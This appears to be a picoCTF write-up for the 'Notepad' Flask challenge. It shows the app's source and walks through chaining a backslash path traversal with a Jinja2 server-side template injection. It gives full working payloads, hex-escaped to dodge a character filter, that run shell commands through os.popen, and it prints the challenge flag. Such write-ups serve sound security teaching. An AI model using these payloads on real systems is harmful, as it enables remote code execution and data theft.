# CTF Competition: picoCTF

### CTF Name: Notepad
**CTF Weight:** 25o points

**Link:** [https://play.picoctf.org/practice/challenge/140?page=1&search=des](https://play.picoctf.org/practice/challenge/204?category=1&page=4&search=)

This challenge provides a simple website written in Flask where we can write and store our notes. The source code to the application was provided. This CTF tested LFI and SSTI.


**app.py**
```
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```

**index.html**
```
<!doctype html>
{% if error is not none %}
  <h3>
    error: {{ error }}
  </h3>
  {% include "errors/" + error + ".html" ignore missing %}
{% endif %}
<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>
```

The key to many of these CTFs is tracking the user input and seeing where the input goes and if those places can be exploited. In this case, the user input is stored in the variable called content.
Immediately after taking in the input, an error is raised if "_" or "/" are in the input.
Next, it checks if the input length is > 512. If it is then an error is raised.
If both these checks are cleared then we can write the note into the `static` folder.

## Writeup:

I noticed that in the index.html, the `{% include "errors/" + error + ".html" ignore missing %}` variable was getting the text from a variable in the `errors` directory. Thus, if we can try to somehow get LFI and write to the `errors` directory, I could then perform a server side template injection attack.

Going back to app.py, I noticed that the name to be written to was using a function called url_fix from the werkzeug.urls library to create the file name. After looking at the source code for url_fix, I saw that it replaces `\` with `/`!!!
This is huge! we can now get around the `/` character being blacklisted by using `\` 
![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/e2eedda6-2b4e-49b6-abb2-74974d45f238)


So, to test my LFI theory I used the following payload to see if it could be written to the errors directory: `..\templates\errors\pleasework`. Sure enough, I saw the URL change to `https://notepad.mars.picoctf.net/templates/errors/pleasework-zWPCSoNIdyc.html` GREAT! this means that it was successful, to verify we can see that is in my file by going to `https://notepad.mars.picoctf.net/?error=pleasework-zWPCSoNIdyc`
This makes the erorr file it reads from the file I just created.
![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/1d90ffa7-d285-43be-859d-f1b447b997ab)


Now our last step is just to perform SSTI. Hacktricks provides great exploit code for SSTI and I found one that didn't have any `/` or `_` as these were blacklisted characters in the app.py
![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/527c08e5-bae9-425a-af9e-579b7cc23252)

I didn't want to the payload to be in the name of the error file so I 'filled' it up by adding a bunch of `..\`'s then the SSTI payload. So the payload looked like this:
`..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\zz{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}`
To see the results I went to `https://notepad.mars.picoctf.net/?error=zz-uVCtHElqvbA` were I saw the flag file: `flag-c8f5526c-4122-4578-96de-d7dd27193798.txt`

![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/fd2577e0-1fc7-4304-a478-479c2ba69ef0)


To read from it, the payload now becomes: `..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\zz{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat${IFS}flag-c8f5526c-4122-4578-96de-d7dd27193798.txt')|attr('read')()%}{%print(a)%}{%endwith%}`

![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/2ecbfec2-60b7-4f4d-9799-de6ccd3a6deb)

The flag is: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`



